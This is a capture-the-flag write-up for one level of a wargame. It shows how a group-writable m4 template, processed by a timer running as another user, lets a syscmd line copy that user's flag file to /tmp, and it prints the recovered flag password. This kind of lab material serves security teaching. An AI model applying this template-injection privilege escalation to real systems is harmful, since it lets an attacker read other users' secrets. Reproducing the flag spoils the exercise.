# Level 04

The file in `/opt/snowcrash/level04` is a bash script named `babel.sh`. Here are the lines that stood out :

```bash
#!/bin/bash
# babel — configuration generator service
# Processes m4 templates and regenerates the active configuration.

TEMPLATE_DIR="/var/lib/babel/templates"
OUTPUT_DIR="/var/lib/babel"
OUTPUT_CONF="${OUTPUT_DIR}/output.conf"
BACKUP_CONF="${OUTPUT_DIR}/output.conf.bak"
CHECKSUM_FILE="${OUTPUT_DIR}/output.conf.sha256"
LOCK_FILE="/tmp/babel.lock"
LOG_FILE="/var/log/babel/babel.log"

# ...

TEMPLATE="${TEMPLATE_DIR}/template.m4"

# ...

if m4 "${TEMPLATE}" > "${OUTPUT_CONF}" 2>> "${LOG_FILE}"; then

# ...
```

We have a lot of info on where files are located, including the log file that we can read. But our best course of action is the m4 template. If we can edit the template, we can execute whatever we want with `syscmd`.

Just like before, we search for files with the same name : `babel` :

```bash
$ find / -name '*babel*' -ls 2>/dev/null 
   138322      4 drwxr-xr-x   2 flag04   root         4096 Jun  9 19:03 /var/log/babel
   138330     68 -rw-r--r--   1 flag04   flag04      64430 Sep  8 12:55 /var/log/babel/babel.log
   138315      4 drwxr-xr-x   3 flag04   root         4096 Jun  9 19:04 /var/lib/babel
   138324      0 lrwxrwxrwx   1 root     root           31 Jun  9 19:03 /etc/systemd/system/timers.target.wants/babel.timer -> /etc/systemd/system/babel.timer
   524469      4 -rw-r--r--   1 root     root          204 Jun  9 19:03 /etc/systemd/system/babel.service
   524470      4 -rw-r--r--   1 root     root          190 Jun  9 19:03 /etc/systemd/system/babel.timer
   524467      8 -rwxr-xr-x   1 root     root         4241 Jun  9 19:03 /opt/snowcrash/level04/babel.sh
```

For the sake of clarity, I removed pybabel folders, as they are not useful here. We can see, like the previous level, a service and a timer, that are running and execute the script every 30 seconds, under the user flag04. We now need to see if we can edit the template file :

```bash
$ ls -l /var/lib/babel/templates/template.m4 
-rw-rw-r-- 1 root babel 4811 Sep  8 12:46 /var/lib/babel/templates/template.m4
$ groups
level04 babel levelgroup
```

And as a matter of fact, we can ! We belong to the `babel` group, that can write in the file. Now we just need to add the following line at the top of the existing template file :

```m4
syscmd(`cat /home/flag04/.flag >/tmp/flag.txt')
```

We wait 30 seconds, and the password is now in /tmp/flag.txt ! : ne2searoevaevoem4ov4ar8ap